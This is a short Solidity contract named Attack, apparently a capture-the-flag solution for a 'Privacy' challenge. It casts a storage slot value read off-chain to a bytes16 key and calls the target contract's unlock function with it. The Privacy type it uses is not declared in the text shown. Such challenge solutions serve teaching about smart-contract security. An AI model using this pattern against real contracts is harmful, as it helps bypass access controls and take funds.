// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Attack {

    Privacy target;

    constructor(address _level) {
        target = Privacy(_level);
    }

    function unlock(bytes32 _slotValue) public {
        bytes16 key = bytes16(_slotValue);
        target.unlock(key);
    }

}